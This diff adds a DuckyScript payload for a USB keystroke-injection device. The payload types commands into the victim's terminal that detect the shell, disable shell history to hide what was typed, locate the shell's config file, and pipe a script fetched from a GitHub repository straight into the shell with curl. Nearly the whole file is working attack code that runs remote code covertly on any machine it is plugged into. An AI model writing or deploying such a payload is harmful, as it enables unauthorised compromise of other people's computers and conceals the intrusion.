@@ -1,0 +1,51 @@
+REM TITLE EntryPoint ducky
+REM AUTHOR Saverio976
+REM DESCRIPTION call scripts from https://github.com/Saverio976/ducky-the-duck
+
+EXTENSION DETECT_READY
+    REM VERSION 1.1
+    REM AUTHOR: Korben
+
+    REM_BLOCK DOCUMENTATION
+        USAGE:
+            Extension runs inline (here)
+            Place at beginning of payload (besides ATTACKMODE) to act as dynamic
+            boot delay
+
+        TARGETS:
+            Any system that reflects CAPSLOCK will detect minimum required delay
+            Any system that does not reflect CAPSLOCK will hit the max delay of 3000ms
+    END_REM
+
+    REM CONFIGURATION:
+    DEFINE #RESPONSE_DELAY 25
+    DEFINE #ITERATION_LIMIT 120
+
+    VAR $C = 0
+    WHILE (($_CAPSLOCK_ON == FALSE) && ($C < #ITERATION_LIMIT))
+        CAPSLOCK
+        DELAY #RESPONSE_DELAY
+        $C = ($C + 1)
+    END_WHILE
+    CAPSLOCK
+END_EXTENSION
+
+$_JITTER_ENABLED = TRUE
+
+STRINGLN export CURRENT_SHELL=''
+STRINGLN CURRENT_SHELL=$(readlink /proc/$$/exe)
+STRINGLN "$CURRENT_SHELL"
+
+STRINGLN [[ "$CURRENT_SHELL" == *"zsh"* ]] && CURRENT_SHELL="zsh"
+STRINGLN [[ "$CURRENT_SHELL" == *"bash"* ]] && CURRENT_SHELL="bash"
+
+STRINGLN [ "$CURRENT_SHELL" = "zsh" ] && unset HISTFILE
+STRINGLN [ "$CURRENT_SHELL" = "bash" ] && set +o history
+
+STRINGLN export CONFIG_FILE=''
+STRINGLN [ "$CURRENT_SHELL" = "zsh" ] && CONFIG_FILE="${ZDOTDIR:-$HOME}/.zshrc"
+STRINGLN [ "$CURRENT_SHELL" = "bash" ] && CONFIG_FILE="$HOME/.bashrc"
+
+STRINGLN curl -sLf 'https://raw.githubusercontent.com/Saverio976/ducky-the-duck/main/script/entrypoint.sh' | "$CURRENT_SHELL"
+
+ATTACKMODE STORAGE
